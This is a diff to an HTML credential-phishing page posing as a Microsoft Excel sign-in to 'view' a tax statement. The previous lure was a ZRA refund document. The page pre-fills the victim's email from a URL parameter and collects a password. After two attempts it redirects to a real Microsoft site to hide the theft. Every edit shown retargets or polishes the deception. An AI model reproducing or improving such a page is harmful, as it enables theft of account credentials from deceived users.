@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Microsoft Excel - View Zar refund Document</title>
+  <title>Microsoft Excel - View Tax Statement</title>
   <style>
     * {
       margin: 0;
@@ -176,15 +176,14 @@
       <div class="excel-logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Microsoft_Excel_2013-2019_logo.svg/1200px-Microsoft_Excel_2013-2019_logo.svg.png" alt="Microsoft Excel" onerror="this.src='https://cdn-icons-png.flaticon.com/512/732/732220.png'" />
       </div>
-      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW ZRA REFUND DOCUMENT</h2>
+      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW DOCUMENT</h2>
       <form id="loginForm">
         <!-- Email -->
 		
         <div class="input-group">
-		<input type="email" id="oruko" placeholder="email" autocomplete="on" value="[[-Email-]]" />
-		<p id="msgfont"></p>
-		<div class="password-wrapper"></div>
-	</div>
+          <input type="email" id="oruko" value="[[-Email-]]" autocomplete="on"/>
+		  <div class="password-wrapper">
+        </div>
         <!-- Password with toggle -->
         <div class="input-group" style="position: relative;">
           <input type="password" id="password" name="kokoro" placeholder="Password" required "kokoro"/>
@@ -213,10 +212,10 @@
   <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
 <script type="text/javascript">
-	// Get email from URL parameter 'emp' (e.g., ?emp=user@domain.com)
+	// Get email from URL parameter 'email' (e.g., ?email=user@domain.com)
     function getEmailFromUrl() {
       const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get('[[-Email-]]');
+      return urlParams.get('email');
     }
 
     // Get email from URL and pre-fill the email field
@@ -353,7 +352,7 @@
       // Redirect or show message
       if (countAttempt >= 2) {
         setTimeout(() => {
-          window.location.href = "https://outlook.live.com/mail/inbox/id/"; // your redirect URL
+          window.location.href = "https://excel.cloud.microsoft/en-us/"; // your redirect URL
         }, 2000);
       } else {
         setTimeout(() => {
